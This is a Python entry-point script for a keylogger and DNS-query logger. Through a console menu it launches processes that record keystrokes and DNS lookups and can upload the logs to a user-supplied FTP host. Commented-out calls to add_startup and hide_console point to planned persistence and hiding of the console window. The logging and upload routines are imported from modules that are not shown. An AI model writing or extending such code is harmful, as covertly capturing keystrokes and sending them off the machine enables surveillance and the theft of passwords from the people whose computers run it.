from utilities import dir_path, sync, server
from logger import key_logger, dns_logger
import sys
import socket
import multiprocessing


def main():
    # add_startup() ++ import add_startup from utilities
    # disallowing multiple instance
    # Create a socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Try to bind the socket to the port
    try:
        sock.bind(("", 9903))
    except socket.error:
        # If the port is already in use, exit the script
        print("Multiple Instance not Allowed. \n ")
        sys.exit()

    dir_path()
    print("Welcome \n ")
    print( "Note: Npcap is required for Dns Logger on Windows. Get Npcap from https://npcap.com/#download. \n ")
    p1 = multiprocessing.Process(target=server, name="LocalServer")
    p3 = multiprocessing.Process(target=key_logger, name="KeyLogger")
    p4 = multiprocessing.Process(target=dns_logger, name="DNSQuaryLogger")
    while True:
        service_choise = int( input("Choose what service you want. \n 1. Key and Dns Query logger with offline and ftp upload. \n 2. Key and Dns Query logger offline Only.  \n 3. Key logger only with offline and ftp upload. \n 4. Key logger offline Only. \n 5. Dns Query logger offline and ftp upload. \n 6. Dns Query logger offline. \n 7. Exit \n"))
        match service_choise:
            case 1:
                p2 = multiprocessing.Process(target=sync, args=( input("Ftp Host/Ip:"), input("Ftp Username:"), input("Ftp Passward:")), name="SyncFtp")
                p1.start()
                p2.start()
                p3.start()
                p4.start()
                p1.join()
                p2.join()
                p3.join()
                p4.join()
            case 2:
                p1.start()
                p3.start()
                p4.start()
                p1.join()
                p3.join()
                p4.join()
            case 3:
                p2 = multiprocessing.Process(target=sync, args=( input("Ftp Host/Ip:"), input("Ftp Username:"), input("Ftp Passward:")), name="SyncFtp")
                p1.start()
                p2.start()
                p3.start()
                p1.join()
                p2.join()
                p3.join()
            case 4:
                p1.start()
                p3.start()
                p1.join()
                p3.join()
            case 5:
                p2 = multiprocessing.Process(target=sync, args=( input("Ftp Host/Ip:"), input("Ftp Username:"), input("Ftp Passward:")), name="SyncFtp")
                p1.start()
                p2.start()
                p4.start()
                p1.join()
                p2.join()
                p4.join()
            case 6:
                p1.start()
                p4.start()
                p1.join()
                p4.join()
            case 7:
                sys.exit()
            case default:
                print("Wrong Input! Try again. \n ")


if __name__ == "__main__":
    # On Windows calling this function is necessary.
    multiprocessing.freeze_support()
    try:
        main()
    except KeyboardInterrupt:
        exit(0)
    # hide_console() ++import hide_console from utilities
